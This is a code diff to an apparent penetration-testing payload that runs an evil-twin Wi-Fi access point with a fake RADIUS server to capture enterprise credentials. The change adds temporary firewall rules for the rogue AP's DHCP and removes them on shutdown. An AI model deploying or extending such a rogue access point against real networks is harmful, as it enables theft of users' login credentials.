@@ -22,6 +22,7 @@ from datetime import datetime
 sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))
 
 from payloads._iface_helper import list_interfaces, supports_monitor
+from payloads._ufw import TemporaryUfwRules
 from payloads._web_input import request_input
 
 
@@ -113,6 +114,7 @@ credentials = []        # {"ts", "identity", "type", "data"}
 
 _hostapd_proc = None
 _dnsmasq_proc = None
+_firewall = None
 _radius_thread = None
 _radius_sock = None
 _iface = None
@@ -389,7 +391,7 @@ def _radius_server_loop():
 
 def _start_attack(ap):
     """Start evil twin with fake RADIUS."""
-    global attack_running, status_msg, _hostapd_proc, _dnsmasq_proc
+    global attack_running, status_msg, _hostapd_proc, _dnsmasq_proc, _firewall
     global _radius_thread
 
     iface = _iface
@@ -417,6 +419,8 @@ def _start_attack(ap):
     # Write configs
     _write_hostapd_conf(iface, ap["ssid"], ap.get("channel", 6))
     _write_dnsmasq_conf(iface)
+    _firewall = TemporaryUfwRules("enterprise-ap")
+    _firewall.allow_ap_dhcp(iface, f"{GATEWAY_IP}/24")
 
     # Start RADIUS server
     with lock:
@@ -456,7 +460,7 @@ def _start_attack(ap):
 
 def _stop_attack():
     """Kill hostapd, dnsmasq, RADIUS and restore interface."""
-    global attack_running, _hostapd_proc, _dnsmasq_proc, _radius_sock
+    global attack_running, _hostapd_proc, _dnsmasq_proc, _radius_sock, _firewall
 
     with lock:
         attack_running = False
@@ -485,7 +489,10 @@ def _stop_attack():
             _radius_sock.close()
         except Exception:
             pass
-        _radius_sock = None
+    _radius_sock = None
+    if _firewall:
+        _firewall.close()
+        _firewall = None
 
     # Cleanup
     subprocess.run(["sudo", "killall", "hostapd"], capture_output=True)
